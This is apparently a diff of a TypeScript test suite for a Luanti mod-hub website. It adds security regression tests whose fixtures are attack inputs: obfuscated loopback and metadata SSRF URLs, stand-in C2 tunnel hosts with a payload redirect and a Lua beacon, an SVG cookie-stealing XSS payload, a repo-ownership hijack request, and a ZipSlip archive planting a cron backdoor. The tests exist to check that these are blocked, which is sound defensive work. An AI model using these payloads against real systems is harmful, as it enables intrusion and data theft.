@@ -8,7 +8,7 @@ import { LuantiPackage } from './core/models/package.model';
 import { SettingsService } from './core/services/settings.service';
 import { SeoService } from './core/services/seo.service';
 import { AuthService, formatFriendlyAuthError, sanitizeUserFacingError } from './core/services/auth.service';
-import { TranslationService } from './core/i18n/translation.service';
+import { TranslationService, preloadAllTranslationLocales } from './core/i18n/translation.service';
 import { Top10RowComponent } from './features/top10/top10-row.component';
 import { CatalogComponent } from './features/catalog/catalog.component';
 import { PackageCardComponent } from './features/card/package-card.component';
@@ -88,12 +88,14 @@ describe('App & Core Services', () => {
   let defaultFetchRestore: typeof fetch | null = null;
 
   beforeEach(async () => {
+    await preloadAllTranslationLocales();
     defaultFetchRestore = globalThis.fetch;
     globalThis.fetch = (async () => {
       throw new Error('Network disabled in unit tests unless explicitly mocked');
     }) as unknown as typeof fetch;
     try {
       localStorage.removeItem('lh_last_app_update_notif_at_v1');
+      localStorage.removeItem('lh_recent_discovered_pkgs_v1');
       sessionStorage.removeItem('lh_pwa_auto_updated_version');
     } catch {
       // Ignore storage errors
@@ -8118,7 +8120,7 @@ supported_games = minetest_game, voxelibre
       const afterDetail = pkgService.packages().find(p => p.id === 'TenPlus1/mobs')!;
       expect(afterDetail.thumbnail).toBe('https://content.luanti.org/thumbnails/1/dc6e96f2d4.png');
       expect(afterDetail.banner).toBe(
-        'https://cdn.content.luanti.org/uploads/dc6e96f2d4.png?width=1100&aspect_ratio=16:9&format=png'
+        'https://cdn.content.luanti.org/uploads/dc6e96f2d4.png?width=1100&aspect_ratio=16:9'
       );
 
       // Ensure fetchReviews is NOT blocked by `{positive:0,neutral:0,negative:0}` and fetches `/api/packages/TenPlus1/mobs/reviews`
@@ -8325,16 +8327,16 @@ supported_games = minetest_game, voxelibre
     const cdbLevel3 = 'https://content.luanti.org/thumbnails/3/8f7c4f97f4.png';
     const cdbDoubleExt = 'https://content.luanti.org/thumbnails/1/1486fdc7a4.jpg.png';
     const cdbUpload = 'https://cdn.content.luanti.org/uploads/8f7c4f97f4.jpg';
-    const cdbUploadTile = 'https://cdn.content.luanti.org/uploads/8f7c4f97f4.jpg?width=500&aspect_ratio=3:2&format=png';
-    const cdbUploadBanner = 'https://cdn.content.luanti.org/uploads/8f7c4f97f4.jpg?width=1100&aspect_ratio=16:9&format=png';
-    const cdbUploadGallery = 'https://cdn.content.luanti.org/uploads/8f7c4f97f4.jpg?width=720&aspect_ratio=16:9&format=png';
+    const cdbUploadTile = 'https://cdn.content.luanti.org/uploads/8f7c4f97f4.jpg?width=500&aspect_ratio=3:2';
+    const cdbUploadBanner = 'https://cdn.content.luanti.org/uploads/8f7c4f97f4.jpg?width=1100&aspect_ratio=16:9';
+    const cdbUploadGallery = 'https://cdn.content.luanti.org/uploads/8f7c4f97f4.jpg?width=720&aspect_ratio=16:9';
 
     expect(removeContentDbPngHack('1486fdc7a4.jpg.png')).toBe('1486fdc7a4.jpg');
     expect(removeContentDbPngHack('1a204531fe.png.png')).toBe('1a204531fe.png');
     expect(toCanonicalContentDbUploadUrl(cdbDoubleExt)).toBe('https://cdn.content.luanti.org/uploads/1486fdc7a4.jpg');
     expect(upgradeContentDbThumbnailUrl(cdbDoubleExt)).toBe('https://cdn.content.luanti.org/uploads/1486fdc7a4.jpg');
     expect(formatContentDbCdnUrl(cdbDoubleExt, 'tile')).toBe(
-      'https://cdn.content.luanti.org/uploads/1486fdc7a4.jpg?width=500&aspect_ratio=3:2&format=png'
+      'https://cdn.content.luanti.org/uploads/1486fdc7a4.jpg?width=500&aspect_ratio=3:2'
     );
     expect(formatContentDbCdnUrl(cdbUpload, 'tile')).toBe(cdbUploadTile);
     expect(formatContentDbCdnUrl(cdbUpload, 'banner')).toBe(cdbUploadBanner);
@@ -10341,7 +10343,7 @@ supported_games = minetest_game, voxelibre
       const bootFarming = bootJson.packages.find((p: any) => p.name === 'farming' && p.author === 'TenPlus1');
       expect(bootFarming).toBeTruthy();
       expect(bootFarming.thumbnail).toBe('https://cdn.content.luanti.org/uploads/farming_shot.png');
-      expect(bootFarming.banner).toBe('https://cdn.content.luanti.org/uploads/farming_shot.png?width=1100&aspect_ratio=16:9&format=png');
+      expect(bootFarming.banner).toBe('https://cdn.content.luanti.org/uploads/farming_shot.png?width=1100&aspect_ratio=16:9');
       expect(bootFarming.downloads).toBe(120000);
 
       // 2. Subsequent in-game Luanti client request immediately hits HIT-BOOT-SHARED with compact slimList & legacy thumbnail URL
@@ -13506,5 +13508,588 @@ core.register_node(modname .. ":panel", {
           d.title.includes('exfil-data.trycloudflare.com')
       )
     ).toBe(true);
+  });
+
+  it('should enforce canonicalized SSRF/tunnel blocking, hop-by-hop redirect validation, and extended Lua C2 tunnel detection', async () => {
+    const { fetchWithAnubisSupport } = await import('../../functions/api/lib/upstream');
+
+    // 1. WHATWG URL canonicalized IPv4 / IPv6 / userinfo / trailing-dot / wildcard DNS / tunnel checks
+    expect(isUntrustedTunnelOrPrivateHost('http://0177.0.0.1/')).toBe(true); // Octal loopback
+    expect(isUntrustedTunnelOrPrivateHost('http://0x7f000001/')).toBe(true); // Hex loopback
+    expect(isUntrustedTunnelOrPrivateHost('http://2130706433/')).toBe(true); // Integer loopback
+    expect(isUntrustedTunnelOrPrivateHost('http://127.1/')).toBe(true); // Shorthand loopback
+    expect(isUntrustedTunnelOrPrivateHost('http://[::ffff:7f00:1]/')).toBe(true); // Hex IPv4-mapped IPv6
+    expect(isUntrustedTunnelOrPrivateHost('https://github.com@127.0.0.1/owner/repo')).toBe(true); // Userinfo spoof
+    expect(isUntrustedTunnelOrPrivateHost('https://evil.trycloudflare.com./owner/repo')).toBe(true); // Trailing dot FQDN
+    expect(isUntrustedTunnelOrPrivateHost('https://node1.tail9999.ts.net/owner/repo')).toBe(true); // Tailscale Funnel
+    expect(isUntrustedTunnelOrPrivateHost('https://147.185.221.20.ply.gg/owner/repo')).toBe(true); // playit.gg
+    expect(isUntrustedTunnelOrPrivateHost('https://tunnel.devtunnels.ms/owner/repo')).toBe(true); // VS Code Dev Tunnels
+    expect(isUntrustedTunnelOrPrivateHost('https://127.0.0.1.nip.io/owner/repo')).toBe(true); // DNS rebinding
+    expect(isUntrustedTunnelOrPrivateHost('https://169-254-169-254.sslip.io/latest/meta-data')).toBe(true);
+    expect(isUntrustedTunnelOrPrivateHost('https://203.0.113.42/owner/repo')).toBe(true); // Raw IPv4 literal
+
+    // Trusted public Git forges & ContentDB remain allowed
+    expect(isUntrustedTunnelOrPrivateHost('https://github.com/luanti-org/luanti')).toBe(false);
+    expect(isUntrustedTunnelOrPrivateHost('https://codeberg.org/Wuzzy/Lazarr')).toBe(false);
+    expect(isUntrustedTunnelOrPrivateHost('https://content.luanti.org/packages/Wuzzy/mineclone2/')).toBe(false);
+
+    // 2. Inbound tunnel header detection covers modern ephemeral tunnels (Tailscale, playit, devtunnels, cloudflared)
+    const tsReq = new Request('https://luantihub.org/api/packages', {
+      headers: { 'X-Original-Host': 'backdoor.ts.net' }
+    });
+    expect(detectInboundEphemeralTunnelHeader(tsReq)).not.toBeNull();
+    const blockedTsRes = await edgeMiddleware({
+      request: tsReq,
+      next: async () => new Response('OK', { status: 200 }),
+      env: {}
+    });
+    expect(blockedTsRes.status).toBe(403);
+    expect(blockedTsRes.headers.get('Strict-Transport-Security')).toContain('max-age=31536000');
+
+    // 3. Hop-by-hop redirect validation blocks 302 redirects from a trusted forge to a tunnel or loopback target
+    const origFetch = globalThis.fetch;
+    let tunnelCalled = false;
+    globalThis.fetch = (async (input: RequestInfo | URL) => {
+      const urlStr = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
+      if (urlStr === 'https://github.com/evil/mod/releases/download/v1/mod.zip') {
+        return new Response(null, {
+          status: 302,
+          headers: { Location: 'https://c2-drop.trycloudflare.com/payload.zip' }
+        });
+      }
+      if (urlStr.includes('trycloudflare.com')) {
+        tunnelCalled = true;
+      }
+      return new Response('OK', { status: 200 });
+    }) as typeof fetch;
+
+    try {
+      const bounceRes = await fetchWithAnubisSupport('https://github.com/evil/mod/releases/download/v1/mod.zip');
+      expect(bounceRes.status).toBe(403);
+      expect(bounceRes.headers.get('X-LuantiHub-Redirect-Blocked')).toBe('1');
+      expect(tunnelCalled).toBe(false);
+    } finally {
+      globalThis.fetch = origFetch;
+    }
+
+    // 4. Lua static audit catches extended C2 tunnel domains (ts.net / playit.gg / devtunnels.ms)
+    const c2Lua = 'local h = core.request_http_api()\nh.fetch({ url = "https://botnet.ts.net/beacon" }, function() end)';
+    const c2Diags = runLuacheckStaticAudit(c2Lua, 'c2_mod');
+    expect(c2Diags.some(d => d.code === 'LUA_SUSPICIOUS_TUNNEL_ENDPOINT (E902)')).toBe(true);
+  });
+
+  it('should block PATCH ownership hijack via spoofed repo_url, block ?repo= poisoning, and prevent unverified claims from 451-delisting ContentDB packages', async () => {
+    const { onRequestGet: readmeOnRequestGet } = await import('../../functions/api/packages/[author]/[name]/readme');
+    const { onRequestGet: releasesOnRequestGet } = await import('../../functions/api/packages/[author]/[name]/releases');
+    const secret = 'test-anti-hijack-secret-2026';
+
+    // Attacker owns github:attacker_user, tries to hijack Wuzzy/mineclone2 by sending body.repo_url = https://github.com/attacker_user/mineclone2
+    const attackerToken = await createSessionToken('usr_attacker', secret, {
+      username: 'attacker_user',
+      verified: true
+    });
+
+    const insertedPackages: any[] = [];
+    const mockDb: any = {
+      prepare(sql: string) {
+        return {
+          bind(...args: any[]) {
+            return {
+              async first() {
+                if (sql.includes('FROM users WHERE id = ?')) {
+                  return { id: 'usr_attacker', username: 'attacker_user', display_name: 'Attacker' };
+                }
+                return null;
+              },
+              async all() {
+                if (sql.includes('FROM user_identities')) {
+                  return {
+                    results: [
+                      {
+                        provider: 'github',
+                        provider_username: 'attacker_user',
+                        access_token: 'gho_verified_attacker'
+                      }
+                    ]
+                  };
+                }
+                return { results: [] };
+              },
+              async run() {
+                if (sql.includes('INSERT INTO packages')) {
+                  insertedPackages.push({ sql, args });
+                }
+                return { success: true };
+              }
+            };
+          }
+        };
+      }
+    };
+
+    const origFetch = globalThis.fetch;
+    globalThis.fetch = (async (input: RequestInfo | URL) => {
+      const urlStr = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
+      if (urlStr.includes('content.luanti.org/api/packages/Wuzzy/mineclone2')) {
+        return new Response(
+          JSON.stringify({
+            author: 'Wuzzy',
+            name: 'mineclone2',
+            title: 'VoxeLibre',
+            type: 'game',
+            repo: 'https://git.minetest.land/VoxeLibre/VoxeLibre'
+          }),
+          { status: 200, headers: { 'Content-Type': 'application/json' } }
+        );
+      }
+      if (urlStr.includes('content.luanti.org/api/packages/?')) {
+        return new Response(
+          JSON.stringify([
+            {
+              author: 'Wuzzy',
+              name: 'mineclone2',
+              title: 'VoxeLibre',
+              type: 'game'
+            }
+          ]),
+          { status: 200, headers: { 'Content-Type': 'application/json' } }
+        );
+      }
+      if (urlStr.includes('api.github.com/repos/attacker_user/mineclone2')) {
+        return new Response(
+          JSON.stringify({ default_branch: 'main', owner: { login: 'attacker_user' }, name: 'mineclone2' }),
+          { status: 200, headers: { 'Content-Type': 'application/json' } }
+        );
+      }
+      if (urlStr.includes('raw.githubusercontent.com/attacker_user/mineclone2')) {
+        if (urlStr.endsWith('mod.conf')) {
+          return new Response('name = mineclone2\ntitle = Spoofed\ndescription = Spoofed mod\n', { status: 200 });
+        }
+        if (urlStr.endsWith('init.lua')) {
+          return new Response('-- clean lua\n', { status: 200 });
+        }
+        if (urlStr.endsWith('LICENSE')) {
+          return new Response('MIT License\nPermission is hereby granted, free of charge', { status: 200 });
+        }
+        return new Response('', { status: 404 });
+      }
+      return new Response('{}', { status: 404 });
+    }) as typeof fetch;
+
+    try {
+      // 1. PATCH hijack attempt must be rejected with 403 and zero D1 package inserts
+      const hijackPatchRes = await packageDetailOnRequestPatch({
+        request: new Request('https://luantihub.org/api/packages/Wuzzy/mineclone2', {
+          method: 'PATCH',
+          headers: {
+            'Content-Type': 'application/json',
+            Cookie: `lh_session=${attackerToken}`
+          },
+          body: JSON.stringify({
+            repo_url: 'https://github.com/attacker_user/mineclone2',
+            tags: ['pwned']
+          })
+        }),
+        params: { author: 'Wuzzy', name: 'mineclone2' },
+        env: { DB: mockDb, SESSION_SECRET: secret }
+      });
+      expect(hijackPatchRes.status).toBe(403);
+      expect(insertedPackages.length).toBe(0);
+
+      // 2. ?repo= pointing to an unrelated owner/repo must be ignored on readme.ts & releases.ts
+      const poisonedReadmeRes = await readmeOnRequestGet({
+        request: new Request(
+          'https://luantihub.org/api/packages/UnknownUser/unknown_mod/readme?repo=' +
+            encodeURIComponent('https://github.com/attacker_user/evil_phishing_readme')
+        ),
+        params: { author: 'UnknownUser', name: 'unknown_mod' },
+        env: { DB: mockDb }
+      });
+      expect(poisonedReadmeRes.status).toBe(200);
+      const poisonedReadmeJson = await poisonedReadmeRes.json();
+      expect(poisonedReadmeJson.readme).toBeNull();
+
+      const poisonedReleasesRes = await releasesOnRequestGet({
+        request: new Request(
+          'https://luantihub.org/api/packages/UnknownUser/unknown_mod/releases?repo=' +
+            encodeURIComponent('https://github.com/attacker_user/evil_phishing_readme')
+        ),
+        params: { author: 'UnknownUser', name: 'unknown_mod' },
+        env: { DB: mockDb }
+      });
+      expect(poisonedReleasesRes.status).toBe(200);
+      const poisonedReleasesJson = await poisonedReleasesRes.json();
+      expect(poisonedReleasesJson).toEqual([]);
+    } finally {
+      globalThis.fetch = origFetch;
+    }
+  });
+
+  it('should block SVG/HTML XSS payloads in ?proxy_image=, fail closed when SESSION_SECRET is unset, require OAuth state cookies, and sanitize ZipSlip paths', async () => {
+    const { onRequestGet: packagesIndexGet } = await import('../../functions/api/packages/index');
+    const { onRequestGet: oauthCallbackGet } = await import('../../functions/api/auth/[provider]/callback');
+    const { normalizeLuantiPackageZip } = await import('../../functions/api/lib/upstream');
+
+    // 1. Missing SESSION_SECRET fails closed across JWT, OAuth state, and Audit Proof tokens
+    await expect(createSessionToken('usr_1', undefined)).rejects.toThrow();
+    expect(await verifySessionToken('fake.sig', undefined)).toBeNull();
+    expect(await verifySessionTokenClaims('fake.sig', '')).toBeNull();
+    expect(await verifyOAuthStateToken('fake.sig', 'github', undefined)).toBe(false);
+    expect(await verifyAuditProofToken('fake.sig', 'github:a/b', undefined)).toBe(false);
+
+    // 2. OAuth callback rejects valid HMAC state when the browser lacks the matching lh_oauth_state cookie (login-CSRF / account-link defense)
+    const secret = 'oauth-cookie-bind-secret-2026';
+    const validState = await createOAuthStateToken('github', secret);
+    const missingCookieRes = await oauthCallbackGet({
+      params: { provider: 'github' },
+      request: new Request(
+        `https://luantihub.org/api/auth/github/callback?code=csrf_code&state=${encodeURIComponent(validState)}`
+      ),
+      env: {
+        GITHUB_CLIENT_ID: 'cid',
+        GITHUB_CLIENT_SECRET: 'csec',
+        SESSION_SECRET: secret
+      }
+    });
+    expect(missingCookieRes.status).toBe(302);
+    expect(missingCookieRes.headers.get('Location')).toContain('auth_error=session_expired');
+
+    // 3. GET /api/packages?proxy_image= blocks SVG XSS payloads (even with spoofed image/png header) and serves valid PNGs with strict CSP sandbox
+    const valid1x1Png = new Uint8Array([
+      0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
+      0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
+      0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
+      0x08, 0x06, 0x00, 0x00, 0x00, 0x1f, 0x15, 0xc4,
+      0x89, 0x00, 0x00, 0x00, 0x0a, 0x49, 0x44, 0x41,
+      0x54, 0x78, 0x9c, 0x63, 0x00, 0x01, 0x00, 0x00,
+      0x05, 0x00, 0x01, 0x0d, 0x0a, 0x2d, 0xb4, 0x00,
+      0x00, 0x00, 0x00, 0x49, 0x45, 0x4e, 0x44, 0xae,
+      0x42, 0x60, 0x82
+    ]);
+
+    const origFetch = globalThis.fetch;
+    globalThis.fetch = (async (input: RequestInfo | URL) => {
+      const urlStr = typeof input === 'string' ? input : input instanceof URL ? input.toString() : input.url;
+      if (urlStr.includes('evil.svg')) {
+        return new Response('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>', {
+          status: 200,
+          headers: { 'Content-Type': 'image/png' }
+        });
+      }
+      if (urlStr.includes('safe.png')) {
+        return new Response(valid1x1Png, {
+          status: 200,
+          headers: { 'Content-Type': 'image/png' }
+        });
+      }
+      return new Response('Not found', { status: 404 });
+    }) as typeof fetch;
+
+    try {
+      const svgXssRes = await packagesIndexGet({
+        request: new Request(
+          'https://luantihub.org/api/packages?proxy_image=' +
+            encodeURIComponent('https://raw.githubusercontent.com/owner/repo/main/evil.svg')
+        ),
+        env: {}
+      } as any);
+      expect(svgXssRes.status).toBe(404);
+      expect(await svgXssRes.text()).not.toContain('<svg');
+
+      const disallowedHostRes = await packagesIndexGet({
+        request: new Request(
+          'https://luantihub.org/api/packages?proxy_image=' +
+            encodeURIComponent('https://untrusted-random-cdn.example.com/pic.png')
+        ),
+        env: {}
+      } as any);
+      expect(disallowedHostRes.status).toBe(403);
+
+      const safePngRes = await packagesIndexGet({
+        request: new Request(
+          'https://luantihub.org/api/packages?proxy_image=' +
+            encodeURIComponent('https://raw.githubusercontent.com/owner/repo/main/safe.png')
+        ),
+        env: {}
+      } as any);
+      expect(safePngRes.status).toBe(200);
+      expect(safePngRes.headers.get('Content-Type')).toBe('image/png');
+      expect(safePngRes.headers.get('Content-Security-Policy')).toContain("default-src 'none'");
+      expect(safePngRes.headers.get('Content-Security-Policy')).toContain('sandbox');
+      expect(safePngRes.headers.get('X-Content-Type-Options')).toBe('nosniff');
+    } finally {
+      globalThis.fetch = origFetch;
+    }
+
+    // 4. ZipSlip path traversal entries (`../../etc/passwd`) are stripped/dropped during normalizeLuantiPackageZip
+    const enc = new TextEncoder();
+    const dec = new TextDecoder();
+    const buildStoredZip = (files: Record<string, string>): Uint8Array => {
+      const localParts: Uint8Array[] = [];
+      const cdParts: Uint8Array[] = [];
+      let localOffset = 0;
+      const names = Object.keys(files);
+      for (const name of names) {
+        const nameBytes = enc.encode(name);
+        const dataBytes = enc.encode(files[name]);
+        const lfh = new Uint8Array(30 + nameBytes.length + dataBytes.length);
+        const lfhView = new DataView(lfh.buffer);
+        lfhView.setUint32(0, 0x04034b50, true);
+        lfhView.setUint16(4, 20, true);
+        lfhView.setUint32(18, dataBytes.length, true);
+        lfhView.setUint32(22, dataBytes.length, true);
+        lfhView.setUint16(26, nameBytes.length, true);
+        lfh.set(nameBytes, 30);
+        lfh.set(dataBytes, 30 + nameBytes.length);
+        localParts.push(lfh);
+
+        const cdh = new Uint8Array(46 + nameBytes.length);
+        const cdhView = new DataView(cdh.buffer);
+        cdhView.setUint32(0, 0x02014b50, true);
+        cdhView.setUint16(4, 20, true);
+        cdhView.setUint16(6, 20, true);
+        cdhView.setUint32(20, dataBytes.length, true);
+        cdhView.setUint32(24, dataBytes.length, true);
+        cdhView.setUint16(28, nameBytes.length, true);
+        cdhView.setUint32(42, localOffset, true);
+        cdh.set(nameBytes, 46);
+        cdParts.push(cdh);
+
+        localOffset += lfh.length;
+      }
+      const cdSize = cdParts.reduce((s, p) => s + p.length, 0);
+      const eocd = new Uint8Array(22);
+      const eocdView = new DataView(eocd.buffer);
+      eocdView.setUint32(0, 0x06054b50, true);
+      eocdView.setUint16(8, names.length, true);
+      eocdView.setUint16(10, names.length, true);
+      eocdView.setUint32(12, cdSize, true);
+      eocdView.setUint32(16, localOffset, true);
+
+      const out = new Uint8Array(localOffset + cdSize + 22);
+      let pos = 0;
+      for (const p of [...localParts, ...cdParts, eocd]) {
+        out.set(p, pos);
+        pos += p.length;
+      }
+      return out;
+    };
+    const listZipCentralDirPaths = (zip: Uint8Array): string[] => {
+      const view = new DataView(zip.buffer, zip.byteOffset, zip.byteLength);
+      let eocdPos = -1;
+      for (let i = zip.length - 22; i >= 0; i--) {
+        if (view.getUint32(i, true) === 0x06054b50) {
+          eocdPos = i;
+          break;
+        }
+      }
+      if (eocdPos < 0) return [];
+      const count = view.getUint16(eocdPos + 10, true);
+      let pos = view.getUint32(eocdPos + 16, true);
+      const paths: string[] = [];
+      for (let i = 0; i < count; i++) {
+        const fnLen = view.getUint16(pos + 28, true);
+        const exLen = view.getUint16(pos + 30, true);
+        const cmLen = view.getUint16(pos + 32, true);
+        paths.push(dec.decode(zip.subarray(pos + 46, pos + 46 + fnLen)));
+        pos += 46 + fnLen + exLen + cmLen;
+      }
+      return paths;
+    };
+
+    const maliciousZip = buildStoredZip({
+      'repo-main/mod.conf': 'name = safe_mod\n',
+      'repo-main/init.lua': '-- ok\n',
+      'repo-main/../../etc/cron.d/backdoor': '* * * * * root evil\n',
+      '../outside.lua': 'os.execute("evil")\n'
+    });
+    const normalizedZip = normalizeLuantiPackageZip(maliciousZip, 'safe_mod', 'mod');
+    const extractedEntries = listZipCentralDirPaths(normalizedZip);
+    expect(extractedEntries.some(p => p.includes('..') || p.includes('backdoor') || p.includes('outside.lua'))).toBe(false);
+    expect(extractedEntries).toContain('safe_mod/mod.conf');
+    expect(extractedEntries).toContain('safe_mod/init.lua');
+
+    const dotSlashZip = buildStoredZip({
+      './repo-main/mod.conf': 'name = dot_mod\n',
+      'repo-main//init.lua': '-- safe init\n'
+    });
+    const normalizedDotSlash = normalizeLuantiPackageZip(dotSlashZip, 'dot_mod', 'mod');
+    const dotSlashEntries = listZipCentralDirPaths(normalizedDotSlash);
+    expect(dotSlashEntries).toContain('dot_mod/mod.conf');
+    expect(dotSlashEntries).toContain('dot_mod/init.lua');
+  });
+
+  it('should reset modal transient state on package switch, preserve $& in translations, reconcile concurrent favorites, and keep DRY config utilities in parity', async () => {
+    const {
+      detectSpdxFromLicenseText,
+      parseLuantiConf,
+      stripAuthorForgeSuffix
+    } = await import('./core/config/package-utils.config');
+
+    // 1. Shared DRY utility parity
+    expect(stripAuthorForgeSuffix('sakel-github')).toBe('sakel');
+    expect(stripAuthorForgeSuffix('Wuzzy-codeberg')).toBe('Wuzzy');
+    expect(detectSpdxFromLicenseText('Permission is hereby granted, free of charge, to any person obtaining a copy')).toBe('MIT');
+    expect(detectSpdxFromLicenseText('GNU LESSER GENERAL PUBLIC LICENSE Version 2.1')).toBe('LGPL-2.1-only');
+    const parsedConf = parseLuantiConf('name = test_mod\ndescription = """\nMulti-line\nconf text\n"""\ndepends = default, farming\n');
+    expect(parsedConf['name']).toBe('test_mod');
+    expect(parsedConf['description']).toBe('Multi-line\nconf text');
+    expect(parsedConf['depends']).toBe('default, farming');
+
+    // 2. TranslationService parameter replacement must not corrupt `$&` or `$$` replacement tokens
+    const i18n = TestBed.inject(TranslationService);
+    expect(i18n.translate('modal.filterByTagTooltip', { tag: 'Price $& $$100' })).toContain('Price $& $$100');
+
+    // 3. SettingsService mergeServerFavorites preserves concurrent local toggles while server sync is in flight
+    const settings = TestBed.inject(SettingsService);
+    settings.toggleFavorite('Wuzzy/mineclone2'); // pending local add
+    expect(settings.isFavorite('Wuzzy/mineclone2')).toBe(true);
+    // Simulate stale server GET response arriving before POST /api/auth/favorites completes
+    settings.mergeServerFavorites(['TenPlus1/farming']);
+    expect(settings.isFavorite('Wuzzy/mineclone2')).toBe(true);
+    expect(settings.isFavorite('TenPlus1/farming')).toBe(true);
+
+    // 4. PackageDetailModalComponent resets transient edit/report/review/releaseNotes state when switching from Package A to Package B
+    const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
+    const modal = modalFixture.componentInstance;
+    const pkgA: LuantiPackage = {
+      id: 'AuthorA/mod_a',
+      author: 'AuthorA',
+      name: 'mod_a',
+      title: 'Mod A',
+      type: 'mod',
+      short_desc: 'First mod',
+      thumbnail: 'logo.svg',
+      banner: 'logo.svg',
+      score: 5,
+      downloads: 100,
+      license: 'MIT',
+      media_license: 'CC0-1.0',
+      min_minetest_version: '5.0.0',
+      source: 'official',
+      tags: ['mod']
+    };
+    const pkgB: LuantiPackage = {
+      ...pkgA,
+      id: 'AuthorB/mod_b',
+      author: 'AuthorB',
+      name: 'mod_b',
+      title: 'Mod B'
+    };
+
+    modal.package = pkgA;
+    modal.ngOnInit();
+    modal.isEditingTags.set(true);
+    modal.isReportOpen.set(true);
+    modal.reportDetails = 'Broken link on Mod A';
+    modal.isConfirmingRemove.set(true);
+    modal.reviewTitle = 'Draft review for A';
+    modal.reviewComment = 'Draft comment for A';
+    modal.releaseNotesByKey.set(new Map([['rel-1', { commits: [], totalCommits: 1 } as any]]));
+
+    modal.package = pkgB;
+    modal.ngOnChanges();
+
+    expect(modal.isEditingTags()).toBe(false);
+    expect(modal.isReportOpen()).toBe(false);
+    expect(modal.reportDetails).toBe('');
+    expect(modal.isConfirmingRemove()).toBe(false);
+    expect(modal.reviewTitle).toBe('');
+    expect(modal.reviewComment).toBe('');
+    expect(modal.releaseNotesByKey().size).toBe(0);
+  });
+
+  it('should enforce post-audit review fixes across tunnel detection, SSRF host validation, lazy i18n reactivity, guest favorites, and custom-forge submission', async () => {
+    const { detectInboundEphemeralTunnelHeader } = await import('../../functions/_middleware');
+    const { isUntrustedTunnelOrPrivateHost } = await import('./core/config/git-providers.config');
+    const { classifyCandidateGitRepoUrl } = await import('../../functions/api/lib/author-git-sync');
+    const { TranslatePipe } = await import('./core/i18n/translate.pipe');
+
+    // 1. Tunnel header detector ignores query strings on legitimate origins while blocking tunnel origins
+    const legitSearchReq = new Request('https://luantihub.org/api/packages', {
+      headers: { Referer: 'https://luantihub.org/?q=playit.gg' }
+    });
+    expect(detectInboundEphemeralTunnelHeader(legitSearchReq)).toBeNull();
+
+    const evilTunnelReq = new Request('https://luantihub.org/api/packages/git', {
+      method: 'POST',
+      headers: { Origin: 'https://attacker.trycloudflare.com' }
+    });
+    expect(detectInboundEphemeralTunnelHeader(evilTunnelReq)).not.toBeNull();
+
+    // 2. SSRF host validator & custom Git classifier allow hex-prefixed public domains (git.0x7be.net) while blocking internal/hex IPs
+    expect(isUntrustedTunnelOrPrivateHost('https://git.0x7be.net/dirk/mymod')).toBe(false);
+    expect(isUntrustedTunnelOrPrivateHost('http://0x7f000001/latest/meta-data')).toBe(true);
+    expect(isUntrustedTunnelOrPrivateHost('http://metadata/computeMetadata/v1')).toBe(true);
+    expect(isUntrustedTunnelOrPrivateHost('not-a-valid-url')).toBe(true);
+
+    const classifiedCustom = classifyCandidateGitRepoUrl('https://git.0x7be.net/dirk/mymod');
+    expect(classifiedCustom).not.toBeNull();
+    expect(classifiedCustom?.provider).toBe('custom');
+
+    // 3. TranslatePipe invalidates cached translation once lazy locale dictionary finishes loading
+    const i18n = TestBed.inject(TranslationService);
+    const pipe = TestBed.runInInjectionContext(() => new TranslatePipe());
+    i18n.setLocale('sk');
+    await i18n.ensureLocaleLoaded('sk');
+    const translatedSk = pipe.transform('header.submitGit');
+    expect(typeof translatedSk).toBe('string');
+    expect(translatedSk.length).toBeGreaterThan(0);
+    i18n.setLocale('en');
+
+    // 5. Guest add+remove before login must not tombstone server favorites on mergeServerFavorites
+    const settings = TestBed.inject(SettingsService);
+    settings.isAuthenticatedSession.set(false);
+    settings.favorites.set([]);
+    settings.clearPendingFavoriteOps();
+    settings.toggleFavorite('Wuzzy/mineclone2'); // guest add
+    settings.toggleFavorite('Wuzzy/mineclone2'); // guest remove
+    expect(settings.isFavorite('Wuzzy/mineclone2')).toBe(false);
+    // User logs in and server reports Wuzzy/mineclone2 is saved on their account:
+    settings.mergeServerFavorites(['Wuzzy/mineclone2']);
+    expect(settings.isFavorite('Wuzzy/mineclone2')).toBe(true);
+
+    // 6. SubmitModalComponent classifies custom git host as 'custom' and passes requestAdminClaim on publish
+    const authService = TestBed.inject(AuthService);
+    const pkgService = TestBed.inject(PackageService);
+    (authService as any)._currentUser.set({
+      id: 'usr_custom',
+      username: 'dirk',
+      avatar_url: 'logo.svg',
+      identities: [{ provider: 'codeberg', username: 'dirk', verified: true }]
+    });
+    const submitFixture = TestBed.createComponent(SubmitModalComponent);
+    const submitComp = submitFixture.componentInstance;
+    submitComp.repoUrl = 'https://git.0x7be.net/dirk/mymod';
+    submitComp.onUrlChange();
+    expect(submitComp.parsedRepoTarget()?.provider).toBe('custom');
+    expect(submitComp.supportsDirectOwnerAuth(submitComp.parsedRepoTarget()?.provider)).toBe(false);
+
+    submitComp.warrantyOwnership = true;
+    submitComp.warrantyAssets = true;
+    submitComp.warrantyTakedown = true;
+    submitComp.auditReport.set({
+      valid: true,
+      auditToken: 'tok_custom_123',
+      ownershipVerified: false,
+      pendingAdminClaim: true,
+      configFound: 'mod.conf',
+      luacheckPassed: true,
+      licenseValid: true,
+      diagnostics: []
+    });
+    expect(submitComp.canPublish()).toBe(true);
+
+    const submitSpy = vi.spyOn(pkgService, 'auditOrSubmitGitPackage').mockResolvedValue({
+      success: true,
+      pendingModeration: true,
+      message: 'Queued for admin claim review.'
+    });
+    await submitComp.onPublish();
+    expect(submitSpy).toHaveBeenCalledWith(expect.objectContaining({
+      repoUrl: 'https://git.0x7be.net/dirk/mymod',
+      dryRun: false,
+      requestAdminClaim: true
+    }));
   });
 });
